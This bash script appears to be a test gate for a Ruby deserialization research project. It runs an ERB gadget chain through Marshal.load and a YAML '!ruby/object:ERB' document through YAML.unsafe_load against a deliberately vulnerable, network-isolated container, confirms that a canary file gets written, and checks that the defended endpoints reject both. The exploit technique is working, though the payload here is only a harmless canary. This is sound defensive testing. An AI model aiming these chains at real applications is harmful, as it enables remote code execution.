#!/usr/bin/env bash
# ©AngelaMos | 2026
# target-gate.sh

set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

IMAGE="marshalsea-target:local"
CONTAINER="marshalsea-target-gate"
NETWORK="marshalsea-target-gate-net"
BUILD_IMAGE="ruby:4.0-slim"
CANARY_PATH="/tmp/marshalsea-canary"
CANARY_MARKER="fired"
TARGET_BASE="http://${CONTAINER}:4567"
PINNED_GEMS="rack 3.2.6 sinatra 4.2.1 rackup 2.3.1 webrick 1.9.2"

cleanup() {
    docker rm -f "${CONTAINER}" >/dev/null 2>&1 || true
    docker network rm "${NETWORK}" >/dev/null 2>&1 || true
}
trap cleanup EXIT

failures=0

fail() {
    echo "  FAIL   $1"
    failures=$((failures + 1))
}

pass() {
    echo "  PASS   $1"
}

echo "building target image"
docker build -q -f "${HERE}/target/Dockerfile" -t "${IMAGE}" "${HERE}" >/dev/null || {
    echo "FAIL image build"
    exit 1
}

cleanup
docker network create --internal "${NETWORK}" >/dev/null || {
    echo "FAIL could not create the isolated network"
    exit 1
}

docker run -d --name "${CONTAINER}" \
    --network "${NETWORK}" \
    --read-only \
    --tmpfs /tmp:rw,noexec,nosuid,size=1m \
    --cap-drop ALL \
    --security-opt no-new-privileges \
    --pids-limit 128 \
    --memory 256m \
    "${IMAGE}" >/dev/null

client() {
    local path="$1"
    local cookie="${2:-}"
    docker run --rm --network "${NETWORK}" \
        -e "TARGET_BASE=${TARGET_BASE}" \
        -v "${HERE}/scripts/target_client.rb:/client.rb:ro" \
        "${BUILD_IMAGE}" ruby /client.rb "${path}" "${cookie}" 2>/dev/null
}

status_of() { printf '%s' "$1" | head -1 | cut -f1; }
body_of() { printf '%s' "$1" | tail -n +2; }

for _ in $(seq 1 40); do
    [[ "$(status_of "$(client /)")" == "200" ]] && break
    sleep 0.5
done

root="$(client /)"
if [[ "$(status_of "${root}")" != "200" ]]; then
    echo "FAIL target never became reachable inside ${NETWORK}"
    docker logs "${CONTAINER}" 2>&1 | tail -20
    exit 1
fi

echo
body_of "${root}" | head -3
echo

echo "=== 1 isolation ==="
egress="$(docker run --rm --network "${NETWORK}" "${BUILD_IMAGE}" \
    sh -c 'timeout 6 getent hosts rubygems.org >/dev/null 2>&1 && echo REACHED || echo BLOCKED' 2>/dev/null)"
if [[ "${egress}" == "BLOCKED" ]]; then
    pass "the network that runs attacker Ruby has no route off the host"
else
    fail "the target network reaches the internet, so a payload can too"
fi

resolved="$(docker run --rm --network none "${IMAGE}" \
    ruby -e 'print %w[rack sinatra rackup webrick].map { |g|
      "#{g} #{Gem::Specification.find_all_by_name(g).map(&:version).max}" }.join(" ")' 2>/dev/null)"
echo "  resolved: ${resolved}"
if [[ "${resolved}" == "${PINNED_GEMS}" ]]; then
    pass "the image ships exactly the pinned dependency versions"
else
    fail "dependency drift: expected '${PINNED_GEMS}'"
fi

echo
echo "=== 2 the vulnerable endpoint ==="
payload="$(docker run --rm --network none -v "${HERE}/lib:/app/lib:ro" -w /app "${BUILD_IMAGE}" \
    ruby -Ilib -e '
require "marshalsea"
require "base64"
chain = Marshalsea::Chains::ErbDefMethod.canary("/tmp/marshalsea-canary", "fired")
state = { user: "attacker", template: chain.generate }
print Base64.strict_encode64(Marshal.dump(state))
')"

if [[ -z "${payload}" ]]; then
    echo "FAIL payload generation produced nothing"
    exit 1
fi

before="$(body_of "$(client /canary)")"
vulnerable="$(client /render "session_state=${payload}")"
after="$(body_of "$(client /canary)")"

echo "  vulnerable endpoint : $(status_of "${vulnerable}") $(body_of "${vulnerable}")"
echo "  canary before/after : ${before} -> ${after}"

if [[ "${before}" == "absent" && "${after}" == "${CANARY_MARKER}" &&
      "$(status_of "${vulnerable}")" == "200" ]]; then
    pass "HTTP request achieved code execution through Marshal.load"
else
    fail "payload did not execute over HTTP with a 200"
fi

docker exec "${CONTAINER}" rm -f "${CANARY_PATH}" >/dev/null 2>&1 || true

echo
echo "=== 3 the defended endpoint ==="
reset="$(body_of "$(client /canary)")"
defended="$(client /render/safe "session_state=${payload}")"
defended_after="$(body_of "$(client /canary)")"

echo "  defended endpoint   : $(status_of "${defended}") $(body_of "${defended}")"
echo "  canary before/after : ${reset} -> ${defended_after}"

if [[ "$(status_of "${defended}")" == "400" && "$(body_of "${defended}")" == rejected:* &&
      "${defended_after}" != "${CANARY_MARKER}" ]]; then
    pass "defended endpoint answered 400 with a rejection and created no canary"
else
    fail "defended endpoint did not reject the identical payload with a 400"
fi

benign="$(docker run --rm --network none -v "${HERE}/lib:/app/lib:ro" -w /app "${BUILD_IMAGE}" \
    ruby -Ilib -e '
require "base64"
print Base64.strict_encode64(Marshal.dump({ user: "guest", template: "hello" }))
')"
legitimate="$(client /render/safe "session_state=${benign}")"
echo "  benign on defended  : $(status_of "${legitimate}") $(body_of "${legitimate}")"
if [[ "$(status_of "${legitimate}")" == "200" &&
      "$(body_of "${legitimate}")" == "rendered template for guest" ]]; then
    pass "defended endpoint still serves a legitimate session with an exact body"
else
    fail "defended endpoint does not serve legitimate sessions, it is not a filter"
fi

echo
echo "=== 4 every response is a contract, not a prefix ==="
encode() {
    docker run --rm --network none "${BUILD_IMAGE}" \
        ruby -e "require \"base64\"; print Base64.strict_encode64(Marshal.dump($1))"
}

check_contract() {
    local label="$1" path="$2" cookie="$3" want_status="$4" want_body="$5"
    local response status body
    response="$(client "${path}" "${cookie}")"
    status="$(status_of "${response}")"
    body="$(body_of "${response}")"
    printf '  %-34s HTTP %-4s %s\n' "${label}" "${status}" "${body:0:56}"
    if [[ "${status}" == "${want_status}" && "${body}" == ${want_body} ]]; then
        pass "${label}"
    else
        fail "${label}: wanted HTTP ${want_status} matching '${want_body}'"
    fi
}

for root_value in '"plain string"' 'nil' '[1, 2]' '{ user: "x" }'; do
    check_contract "root ${root_value} is refused" /render/safe \
        "session_state=$(encode "${root_value}")" 400 'rejected: payload is not a session hash'
done

check_contract "no cookie is refused" /render/safe "" 400 "no session cookie"
check_contract "malformed base64 is refused" /render/safe "session_state=!!!not-base64!!!" \
    400 "no session cookie"

echo
echo "=== 4b the same lesson in YAML ==="
yaml_payload="$(docker run --rm --network none -v "${HERE}/lib:/app/lib:ro" -w /app "${BUILD_IMAGE}" \
    ruby -Ilib -e '
require "marshalsea"
require "base64"
src = "#\nend\nFile.write(%q{/tmp/marshalsea-canary}, %q{fired})\ndef _unused\n"
document = <<~YAML
  ---
  :user: attacker
  :template: !ruby/object:ERB
    src: #{src.inspect}
    filename: "(erb)"
    lineno: 0
YAML
print Base64.strict_encode64(document)
')"

docker exec "${CONTAINER}" rm -f "${CANARY_PATH}" >/dev/null 2>&1 || true
yaml_before="$(body_of "$(client /canary)")"
yaml_vuln="$(client /yaml/unsafe "session_state=${yaml_payload}")"
yaml_after="$(body_of "$(client /canary)")"
echo "  yaml unsafe endpoint: $(status_of "${yaml_vuln}") $(body_of "${yaml_vuln}")"
echo "  canary before/after : ${yaml_before} -> ${yaml_after}"
if [[ "${yaml_before}" != "${CANARY_MARKER}" && "${yaml_after}" == "${CANARY_MARKER}" ]]; then
    pass "YAML.unsafe_load reaches the same code execution as Marshal.load"
else
    fail "the YAML payload did not execute over HTTP"
fi

docker exec "${CONTAINER}" rm -f "${CANARY_PATH}" >/dev/null 2>&1 || true
yaml_safe="$(client /yaml/safe "session_state=${yaml_payload}")"
yaml_safe_after="$(body_of "$(client /canary)")"
echo "  yaml safe endpoint  : $(status_of "${yaml_safe}") $(body_of "${yaml_safe}")"
if [[ "$(status_of "${yaml_safe}")" == "400" && "${yaml_safe_after}" != "${CANARY_MARKER}" &&
      "$(body_of "${yaml_safe}")" == *"ERB"* ]]; then
    pass "the YAML defence names ERB and creates no canary"
else
    fail "the YAML defence did not reject the identical document"
fi

aliased="$(docker run --rm --network none "${BUILD_IMAGE}" ruby -e '
require "base64"
print Base64.strict_encode64("---\n:user: &u guest\n:template: *u\n")
')"
alias_body="$(client /yaml/safe "session_state=${aliased}")"
echo "  inspector-approved, Psych-refused: $(status_of "${alias_body}") $(body_of "${alias_body}")"
if [[ "$(status_of "${alias_body}")" == "400" &&
      "$(body_of "${alias_body}")" == *"Psych refused"* ]]; then
    pass "Psych's own veto is live and not alibied by the inspector"
else
    fail "the inspector approved this document and nothing else stopped it"
fi

echo
echo "=== 5 the class allowlist, not a parse error ==="
class_named() {
    docker run --rm --network none "${BUILD_IMAGE}" ruby -e "
require \"base64\"
def sym(n) = \":\" + (n.bytesize + 5).chr + n
def str(s) = %q(\") + (s.bytesize + 5).chr + s
print Base64.strict_encode64($1)
"
}

for probe in 'Marshal.dump(Object.new)' '("\x04\x08C" + sym("String") + str("hi")).b'; do
    named="$(client /render/safe "session_state=$(class_named "${probe}")")"
    echo "  class-named stream  : $(status_of "${named}") $(body_of "${named}")"
    if [[ "$(status_of "${named}")" == "400" && "$(body_of "${named}")" == *"unapproved class"* ]]; then
        pass "refused on the class name itself, not on a parse error"
    else
        fail "PERMITTED_CLASS_NAMES admitted a class name, or something else rejected it first"
    fi
done

echo
echo "=== 6 error responses leak nothing ==="
leaked=0
for probe in "session_state=$(encode 'nil')" "session_state=!!!"; do
    for path in /render /render/safe; do
        body="$(body_of "$(client "${path}" "${probe}")")"
        if echo "${body}" | grep -qE "app\.rb|/app/lib|marshalsea/marshal"; then
            leaked=1
        fi
    done
done
if [[ ${leaked} -eq 0 ]]; then
    pass "error responses leak no source path or source line"
else
    fail "an error response leaked source paths or source lines"
fi

echo
echo "=== 7 the chain carries no sink tag ==="
sinks="$(docker run --rm --network none -v "${HERE}/lib:/app/lib:ro" -w /app "${BUILD_IMAGE}" \
    ruby -Ilib -e '
require "marshalsea"
chain = Marshalsea::Chains::ErbDefMethod.canary("/tmp/marshalsea-canary", "fired")
blob = Marshal.dump({ user: "attacker", template: chain.generate })
print Marshalsea::Marshal::Parser.new(blob).parse.sinks.length
')"

echo "  sink-tag hits on the working payload : ${sinks}"
if [[ "${sinks}" == "0" ]]; then
    echo "  NOTE   sink detection alone does NOT catch this chain, only the class"
    echo "         allowlist does. ERB defines no marshal_load, so it serializes as"
    echo "         a plain object and carries no sink tag."
else
    fail "expected the ERB chain to carry no sink tag, got ${sinks}"
fi

echo
if [[ ${failures} -eq 0 ]]; then
    echo "GATE PASSED"
    exit 0
fi

echo "GATE FAILED (${failures})"
exit 1
